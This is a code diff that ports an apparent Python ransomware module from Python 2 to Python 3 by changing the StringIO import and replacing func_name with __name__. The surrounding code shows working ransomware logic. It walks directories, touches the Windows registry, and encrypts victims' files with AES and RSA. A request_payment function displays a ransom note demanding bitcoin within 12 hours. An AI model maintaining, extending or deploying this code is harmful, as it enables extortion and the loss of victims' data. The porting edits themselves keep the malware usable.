@@ -9,7 +9,11 @@ import time
 import Queue
 import base64
 import hashlib
-import StringIO
+
+try:
+    from StringIO import StringIO  # Python 2
+except ImportError:
+    from io import StringIO        # Python 3
 
 # packages
 import Crypto.Cipher.AES
@@ -61,7 +65,7 @@ def _threader(tasks):
                 else:
                     break
     except Exception as e:
-        util.log("{} error: {}".format(_threader.func_name, str(e)))
+        util.log("{} error: {}".format(_threader.__name__, str(e)))
 
 @util.threaded
 def _iter_files(rsa_key, base_dir=None):
@@ -86,7 +90,7 @@ def _iter_files(rsa_key, base_dir=None):
                         _winreg.CloseKey(reg_key)
                         break
     except Exception as e:
-        util.log('{} error: {}'.format(_iter_files.func_name, str(e)))
+        util.log('{} error: {}'.format(_iter_files.__name__, str(e)))
 
 def request_payment(bitcoin_wallet):
     """
@@ -100,7 +104,7 @@ def request_payment(bitcoin_wallet):
         alert = util.alert("Your personal files have been encrypted. The service fee to decrypt your files is $100 USD worth of bitcoin (try www.coinbase.com or Google 'how to buy bitcoin'). The service fee must be tranferred to the following bitcoin wallet address: %s. The service fee must be paid within 12 hours or your files will remain encrypted permanently. Deadline: %s" % (bitcoin_wallet, time.localtime(time.time() + 60 * 60 * 12)))
         return "Launched a Windows Message Box with ransom payment information"
     except Exception as e:
-        return "{} error: {}".format(request_payment.func_name, str(e))
+        return "{} error: {}".format(request_payment.__name__, str(e))
 
 def encrypt_aes(plaintext, key, padding=chr(0)):
     """
@@ -135,7 +139,7 @@ def decrypt_aes(ciphertext, key, padding=chr(0)):
     Returns decrypted plaintext as string
 
     """
-    data = StringIO.StringIO(base64.b64decode(ciphertext))
+    data = StringIO(base64.b64decode(ciphertext))
     nonce, tag, ciphertext = [ data.read(x) for x in (Crypto.Cipher.AES.block_size - 1, Crypto.Cipher.AES.block_size, -1) ]
     cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB, nonce)
     return cipher.decrypt_and_verify(ciphertext, tag)
@@ -173,7 +177,7 @@ def encrypt_file(filename, rsa_key):
         else:
             util.log("File '{}' not found".format(filename))
     except Exception as e:
-        util.log("{} error: {}".format(encrypt_file.func_name, str(e)))
+        util.log("{} error: {}".format(encrypt_file.__name__, str(e)))
     return False
 
 def decrypt_file(filename, key):
@@ -199,7 +203,7 @@ def decrypt_file(filename, key):
         else:
             util.log("File '{}' not found".format(filename))
     except Exception as e:
-        util.log("{} error: {}".format(decrypt_file.func_name, str(e)))
+        util.log("{} error: {}".format(decrypt_file.__name__, str(e)))
     return False
 
 def encrypt_files(args):
@@ -226,7 +230,7 @@ def encrypt_files(args):
         else:
             return "File '{}' does not exist".format(target)
     except Exception as e:
-        util.log("{} error: {}".format(encrypt_files.func_name, str(e)))
+        util.log("{} error: {}".format(encrypt_files.__name__, str(e)))
 
 def decrypt_files(rsa_key):
     """
@@ -245,7 +249,7 @@ def decrypt_files(rsa_key):
         globals()['threads']['decrypt_files'] = _threader()
         return "Decrypting files"
     except Exception as e:
-        util.log("{} error: {}".format(decrypt_files.func_name, str(e)))
+        util.log("{} error: {}".format(decrypt_files.__name__, str(e)))
 
 def run(args=None):
     """
